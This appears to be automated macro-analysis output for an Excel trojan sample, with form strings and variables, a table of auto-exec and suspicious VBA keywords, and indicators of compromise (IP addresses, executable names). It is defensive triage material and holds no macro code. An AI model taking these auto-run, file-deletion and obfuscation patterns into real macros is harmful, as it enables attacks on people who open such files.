VBA FORM STRING IN 'Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65' - OLE stream: '_VBA_PROJECT_CUR/Game/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\-Nv��_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65' - OLE stream: '_VBA_PROJECT_CUR/Game/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0���Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65' - OLE stream: '_VBA_PROJECT_CUR/Game/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f�f��`�vK�#l'T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65' - OLE stream: '_VBA_PROJECT_CUR/Game/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s�ө���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65' - OLE stream: '_VBA_PROJECT_CUR/Game/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���YE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65' - OLE stream: '_VBA_PROJECT_CUR/Game/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65' - OLE stream: '_VBA_PROJECT_CUR/Game/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65' - OLE stream: '_VBA_PROJECT_CUR/Game/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���?���?��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65' - OLE stream: '_VBA_PROJECT_CUR/Guess/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T{\xe�v
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65' - OLE stream: '_VBA_PROJECT_CUR/Guess/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65' - OLE stream: '_VBA_PROJECT_CUR/Guess/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�x�[ 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65' - OLE stream: '_VBA_PROJECT_CUR/Guess/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��iRL�xe
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65' - OLE stream: '_VBA_PROJECT_CUR/Guess/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65' - OLE stream: '_VBA_PROJECT_CUR/Guess/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x�L� 
ERROR: Unsupported stored type in user form: 32768
-------------------------------------------------------------------------------
VBA FORM Variable "b'Tar3'" IN 'Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65' - OLE stream: '_VBA_PROJECT_CUR/Game'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Tar2'" IN 'Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65' - OLE stream: '_VBA_PROJECT_CUR/Game'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65' - OLE stream: '_VBA_PROJECT_CUR/Game'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Tar1'" IN 'Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65' - OLE stream: '_VBA_PROJECT_CUR/Game'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'cmdStart'" IN 'Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65' - OLE stream: '_VBA_PROJECT_CUR/Game'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Arrow'" IN 'Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65' - OLE stream: '_VBA_PROJECT_CUR/Game'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65' - OLE stream: '_VBA_PROJECT_CUR/Guess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'LabRight'" IN 'Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65' - OLE stream: '_VBA_PROJECT_CUR/Guess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Sure'" IN 'Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65' - OLE stream: '_VBA_PROJECT_CUR/Guess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65' - OLE stream: '_VBA_PROJECT_CUR/Guess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'LabRest'" IN 'Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65' - OLE stream: '_VBA_PROJECT_CUR/Guess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65' - OLE stream: '_VBA_PROJECT_CUR/Guess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Content'" IN 'Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65' - OLE stream: '_VBA_PROJECT_CUR/Guess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'O1'" IN 'Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65' - OLE stream: '_VBA_PROJECT_CUR/Guess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'1'
-------------------------------------------------------------------------------
VBA FORM Variable "b'O2'" IN 'Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65' - OLE stream: '_VBA_PROJECT_CUR/Guess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'O3'" IN 'Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65' - OLE stream: '_VBA_PROJECT_CUR/Guess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_BeforeClose|Runs when the Excel Workbook is closed       |
|AutoExec  |cmdStart_Click      |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|COMMAND             |May run PowerShell commands                  |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |140.112.1.6         |IPv4 address                                 |
|IOC       |192.192.35.34       |IPv4 address                                 |
|IOC       |203.64.35.100       |IPv4 address                                 |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
|IOC       |STKIT432.DLL        |Executable file name                         |
|IOC       |Msheart.exe         |Executable file name                         |
|IOC       |Freecell.exe        |Executable file name                         |
|IOC       |Sol.exe             |Executable file name                         |
|IOC       |Emm386.exe          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

